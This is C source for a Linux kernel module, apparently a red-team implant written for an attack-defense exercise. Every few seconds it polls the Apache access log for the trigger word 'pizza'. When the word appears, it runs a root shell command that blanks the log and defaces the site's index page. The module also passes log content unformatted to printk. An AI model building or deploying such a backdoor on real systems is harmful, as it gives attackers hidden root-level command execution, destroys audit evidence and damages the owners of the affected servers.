#include <linux/kthread.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/timer.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM file check and command execution module");
MODULE_VERSION("1.0");

#define FILE_PATH "/var/log/apache2/access.log"
#define TARGET_STRING "pizza"

static char* argv[] = {"/bin/bash", "-c", 
	"echo 'nothing to see here' > /var/log/apache2/access.log && echo 'readteam was here' > /var/www/html/index.html"
, NULL};
static char* envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static struct timer_list file_check_timer;
static struct file *file_ptr;
static struct task_struct *file_check_thread;

DECLARE_WAIT_QUEUE_HEAD(kernel_thread_wq);

// Simple memstr implementation
static const char *memstr(const char *haystack, size_t haystack_len, const char *needle, size_t needle_len) {
    if (needle_len > haystack_len)
        return NULL;

    for (size_t i = 0; i <= haystack_len - needle_len; ++i) {
        if (memcmp(haystack + i, needle, needle_len) == 0)
            return haystack + i;
    }

    return NULL;
}

static int execute_command(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static int file_check_thread_function(void *data) {
    allow_signal(SIGKILL);

    while (!kthread_should_stop()) {
        wait_event_interruptible_timeout(kernel_thread_wq, kthread_should_stop(), msecs_to_jiffies(5000));

        if (signal_pending(current))
            break;

        if (file_ptr) {
            char *buf;
            int ret;

            buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
            if (!buf) {
                pr_err("Failed to allocate memory\n");
                continue;
            }

            // Reset file position to the beginning
            file_ptr->f_pos = 0;

            ret = kernel_read(file_ptr, buf, PAGE_SIZE, &file_ptr->f_pos);
            if (ret > 0) {
                const char *result = memstr(buf, ret, TARGET_STRING, strlen(TARGET_STRING));
                if (result) {
		    printk(result);
                    execute_command();
                }
            }

            kfree(buf);
        }
    }

    return 0;
}

static void check_file_content(struct timer_list *t) {
    wake_up_interruptible(&kernel_thread_wq);
    mod_timer(t, jiffies + msecs_to_jiffies(5000)); // 5000 milliseconds = 5 seconds
}

static int __init file_check_init(void) {
    int ret = 0;

    // Open the file for reading
    file_ptr = filp_open(FILE_PATH, O_RDONLY, 0);
    if (IS_ERR(file_ptr)) {
        pr_err("Error opening file\n");
        return PTR_ERR(file_ptr);
    }

    // Start the kernel thread
    file_check_thread = kthread_run(file_check_thread_function, NULL, "file_check_kernel_thread");
    if (IS_ERR(file_check_thread)) {
        pr_err("Failed to create kernel thread\n");
        ret = PTR_ERR(file_check_thread);
        goto err_thread;
    }

    // Initialize and start the timer
    timer_setup(&file_check_timer, check_file_content, 0);
    mod_timer(&file_check_timer, jiffies + msecs_to_jiffies(5000)); // 5000 milliseconds = 5 seconds

    return ret;

err_thread:
    filp_close(file_ptr, NULL);
    return ret;
}

static void __exit file_check_exit(void) {
    // Stop the kernel thread
    if (file_check_thread) {
        kthread_stop(file_check_thread);
    }

    // Delete the timer and close the file when unloading the module
    del_timer_sync(&file_check_timer);
    filp_close(file_ptr, NULL);
    pr_info("Exiting\n");
}

module_init(file_check_init);
module_exit(file_check_exit);

